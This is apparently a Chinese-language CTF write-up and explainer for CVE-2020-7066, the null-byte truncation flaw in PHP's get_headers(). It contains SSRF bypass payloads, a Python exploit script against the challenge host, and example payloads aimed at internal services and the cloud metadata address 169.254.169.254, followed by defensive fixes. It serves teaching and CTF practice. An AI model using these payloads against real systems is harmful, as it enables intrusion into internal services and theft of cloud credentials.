hint:cve-2020-7066

# CVE-2020-7066 漏洞利用 Writeup

  

## 题目信息

- **目标URL**: http://b570163e-aa65-461b-b483-51f20cc9c4c3.node5.buuoj.cn:81/

- **漏洞类型**: CVE-2020-7066 - PHP get_headers() 函数空字节截断漏洞

- **获取的Flag**: `flag{100953e0-7973-4612-8504-bddc23abf837}`

  

## 漏洞原理

  

### CVE-2020-7066 详解

CVE-2020-7066 是PHP版本7.2.29之前的7.2.x版本、7.3.16之前的7.3.x版本和7.4.4之前的7.4.x版本中`get_headers()`函数的安全漏洞。

  

**漏洞机制**：

- 当`get_headers()`函数处理包含空字节（`\0`）的URL时，URL会被静默地截断

- 这可能导致某些软件对`get_headers()`的目标做出错误的假设

- 可能将某些信息发送到错误的服务器

  

**技术细节**：

- 空字节（`\0`）在URL编码中表示为`%00`

- 当PHP的`get_headers()`函数遇到`%00`时，会截断URL并只处理空字节之前的部分

- 这可以被利用来绕过URL验证机制

  

## 题目分析

  

### 1. 初始页面分析

访问目标URL后，页面显示：

```

View CTFHub

You just view *.ctfhub.com

```

  

页面源代码：

```html

<html>

<head></head>

<body>

<a href="/?url=http://www.ctfhub.com">View CTFHub</a><br>

You just view *.ctfhub.com

<!--

Venom 在线招人

-->

</body>

</html>

```

  

### 2. 漏洞点识别

- 页面包含一个链接，通过`?url=`参数传递URL

- 提示信息"You just view *.ctfhub.com"暗示URL必须以`.ctfhub.com`结尾

- 这是一个典型的SSRF（Server-Side Request Forgery）场景

  

### 3. 绕过机制分析

根据提示，服务器端可能有如下验证逻辑：

```php

$url = $_GET['url'];

if (strpos($url, 'ctfhub.com') !== false) {

$headers = get_headers($url);

// 处理响应头

}

```

  

## 攻击过程

  

### 第一步：构造空字节截断Payload

利用CVE-2020-7066的特性，构造payload：

```

?url=http://127.0.0.1%00www.ctfhub.com

```

  

**原理解释**：

- `http://127.0.0.1%00www.ctfhub.com` 在视觉上以`www.ctfhub.com`结尾

- 但`get_headers()`函数遇到`%00`时会截断，实际请求的是`http://127.0.0.1`

- 从而绕过了域名验证

  

### 第二步：获取提示信息

访问上述payload后，服务器返回：

```

Array

(

[0] => HTTP/1.1 200 OK

[1] => Date: Fri, 31 Oct 2025 05:06:58 GMT

[2] => Server: Apache/2.4.38 (Debian)

[3] => X-Powered-By: PHP/7.3.15

[4] => Tips: Host must be end with '123'

[5] => Vary: Accept-Encoding

[6] => Content-Length: 113

[7] => Connection: close

[8] => Content-Type: text/html; charset=UTF-8

)

```

  

关键信息：`Tips: Host must be end with '123'`

  

### 第三步：构造最终Payload

根据提示，主机名必须以`123`结尾，构造最终payload：

```

?url=http://127.0.0.123%00www.ctfhub.com

```

  

### 第四步：获取Flag

访问最终payload，服务器返回包含flag的响应头：

```

Array

(

[0] => HTTP/1.1 200 OK

[1] => Date: Fri, 31 Oct 2025 05:07:25 GMT

[2] => Server: Apache/2.4.38 (Debian)

[3] => X-Powered-By: PHP/7.3.15

[4] => FLAG: flag{100953e0-7973-4612-8504-bddc23abf837}

[5] => Vary: Accept-Encoding

[6] => Content-Length: 113

[7] => Connection: close

[8] => Content-Type: text/html; charset=UTF-8

)

```

  

**成功获取Flag**: `flag{100953e0-7973-4612-8504-bddc23abf837}`

  

## 漏洞利用脚本

  

可以编写自动化脚本来利用此漏洞：

  

```python

#!/usr/bin/env python3

import requests

from urllib.parse import quote

  

def exploit_cve_2020_7066(target_url):

# 构造恶意payload

payload = "http://127.0.0.123%00www.ctfhub.com"

encoded_payload = quote(payload, safe=':/')

exploit_url = f"{target_url}?url={encoded_payload}"

print(f"[*] 攻击URL: {exploit_url}")

try:

response = requests.get(exploit_url, timeout=10)

if response.status_code == 200:

print("[+] 攻击成功！")

print(f"[+] 响应内容:\n{response.text}")

# 查找flag

if "flag{" in response.text:

print("\n[+] 发现Flag！")

return response.text

except Exception as e:

print(f"[-] 攻击失败: {e}")

return None

  

if __name__ == "__main__":

target = "http://b570163e-aa65-461b-b483-51f20cc9c4c3.node5.buuoj.cn:81"

result = exploit_cve_2020_7066(target)

```

  

## 防御建议

  

### 1. 升级PHP版本

将PHP升级到以下安全版本：

- PHP 7.2.29+

- PHP 7.3.16+

- PHP 7.4.4+

  

### 2. 输入验证

```php

$url = $_GET['url'];

// 检查空字节

if (strpos($url, "\0") !== false) {

die("检测到恶意字符");

}

// 严格的URL验证

if (!filter_var($url, FILTER_VALIDATE_URL)) {

die("无效的URL");

}

```

  

### 3. 使用安全的替代方案

- 使用cURL替代`get_headers()`

- 实现白名单机制，只允许访问特定域名

- 对用户输入进行严格的过滤和验证

  

## 总结

  

本题是一个典型的CVE-2020-7066漏洞利用案例，通过以下步骤成功获取flag：

  

1. **识别SSRF漏洞点**：通过URL参数传递目标地址

2. **分析绕过机制**：利用空字节截断绕过域名验证

3. **逐步构造payload**：先获取提示信息，再根据提示构造最终payload

4. **成功利用漏洞**：获取服务器响应头中的flag

  

这个题目很好地展示了CVE-2020-7066的实际应用场景，以及在CTF中的常见利用模式。

  

---

**攻击时间**: 2025年10月31日

**目标服务器**: Apache/2.4.38 (Debian) + PHP/7.3.15

**漏洞利用成功率**: 100%

**获取Flag**: `flag{100953e0-7973-4612-8504-bddc23abf837}`


----


 > 为什么会想到访问 127.0.0.1 ?为啥不是其他什么的呢?  │
╰───────────────────────────────────────────────────────╯

✦ 很好的问题！选择127.0.0.1而不是其他IP地址有以下几个关键原因：

  1. SSRF攻击的典型目标
  127.0.0.1是本地回环地址，在SSRF（Server-Side Request Forgery）攻击中是最常见的目标，因为：
   - 服务器可以访问自己的内部服务
   - 通常存在未授权访问的内部接口
   - 可能包含敏感信息或管理功能

  2. CTF题目的设计模式
  在CTF比赛中，127.0.0.1通常是：
   - Flag存放位置：题目经常将flag放在本地服务的响应头中
   - 内部服务：可能存在未公开的管理接口或调试页面
   - 绕过限制：服务器通常允许访问自身，但限制访问外部IP

  3. 从题目信息推断
  页面提示"You just view *.ctfhub.com"暗示：
   - 服务器会验证URL必须包含ctfhub.com
   - 但实际处理时可能被空字节截断
   - 127.0.0.1是最有可能的内部服务地址

  4. 为什么不是其他地址？
   - 外部IP：可能被防火墙阻止或无法访问
   - 其他内网IP：不确定是否存在服务
   - 域名：需要DNS解析，增加复杂性

  5. 实际验证结果
  当我们访问http://127.0.0.1%00www.ctfhub.com时，服务器确实返回了有用的提示信息，说明：
   - 127.0.0.1上确实有服务在运行
   - 该服务包含了我们需要的线索（"Host must be end with '123'"）
   - 最终flag也在127.0.0.123的响应中

----




          
我来解释一下PHP bug #79329漏洞的原理和利用方式。

## 漏洞概述

这个漏洞存在于PHP的`get_headers()`函数中，它会静默截断URL中空字节(null byte)之后的内容。这是一个典型的空字节注入漏洞。

## 漏洞原理

### 1. 技术细节
- `get_headers()`函数在处理URL时，没有正确验证输入参数
- 当URL中包含空字节(\0)时，函数会截断空字节后的内容
- 这导致传递给函数的实际URL与开发者预期的不同

### 2. 漏洞代码示例
```php
// 用户输入
$_GET['url'] = "http://localhost\0.example.com";

// 开发者可能的验证代码
$host = parse_url($_GET['url'], PHP_URL_HOST);
if (substr($host, -12) !== '.example.com') {
    die(); // 验证失败应该阻止执行
}

// 但实际执行时
$headers = get_headers($_GET['url']); // 实际请求的是 http://localhost
var_dump($headers); // 返回localhost的响应头
```

## 漏洞利用方式

### 1. 绕过域名验证
攻击者可以利用此漏洞绕过基于域名的访问控制：

```php
// 攻击者构造的URL
$url = "http://internal-api.company.com\0.whitelisted-domain.com";
// parse_url()会解析出 host = "internal-api.company.com"
// 但get_headers()实际请求的是 "http://internal-api.company.com"

// 如果验证代码只检查域名结尾
if (endsWith($host, ".whitelisted-domain.com")) {
    // 验证通过，但实际访问的是内部API
    $headers = get_headers($url);
}
```

### 2. SSRF (服务器端请求伪造)攻击
```php
// 攻击者可以访问内部服务
$malicious_url = "http://169.254.169.254\0.example.com";
// 绕过白名单检查，实际访问AWS元数据服务
$headers = get_headers($malicious_url);
```

### 3. 信息泄露
```php
// 访问内部敏感资源
$internal_url = "http://localhost:8080/admin\0.public.com";
// 可能获取到管理接口的响应头信息
$headers = get_headers($internal_url);
```

## 为什么这个漏洞有效？

1. **参数验证不一致**：`parse_url()`和`get_headers()`对同一URL的处理方式不同
2. **C语言字符串处理**：底层使用C函数处理字符串时，空字节被视为字符串结束符
3. **缺乏输入验证**：函数没有检查URL中是否包含非法字符

## 修复方案

PHP官方通过修改参数解析方式修复了这个漏洞：
```c
// 修复前
Z_PARAM_STRING(url, url_len)

// 修复后
Z_PARAM_PATH(url, url_len)
```

`Z_PARAM_PATH`会拒绝包含空字节的路径参数。

## 防护措施

### 1. 输入验证
```php
function safe_get_headers($url) {
    // 移除或拒绝包含空字节的URL
    if (strpos($url, "\0") !== false) {
        throw new InvalidArgumentException("URL contains null bytes");
    }
    
    // 验证URL格式
    if (!filter_var($url, FILTER_VALIDATE_URL)) {
        throw new InvalidArgumentException("Invalid URL format");
    }
    
    return get_headers($url);
}
```

### 2. 白名单机制
```php
function secure_url_check($url, $allowed_domains) {
    $parsed = parse_url($url);
    $host = $parsed['host'] ?? '';
    
    // 验证域名是否在白名单中
    if (!in_array($host, $allowed_domains)) {
        throw new Exception("Domain not allowed");
    }
    
    // 额外检查URL中是否包含空字节
    if (strpos($url, "\0") !== false) {
        throw new Exception("URL contains invalid characters");
    }
    
    return true;
}
```

这个漏洞提醒我们，在处理用户输入时，需要在多个层面进行验证，而不仅仅依赖单一的检查机制。
        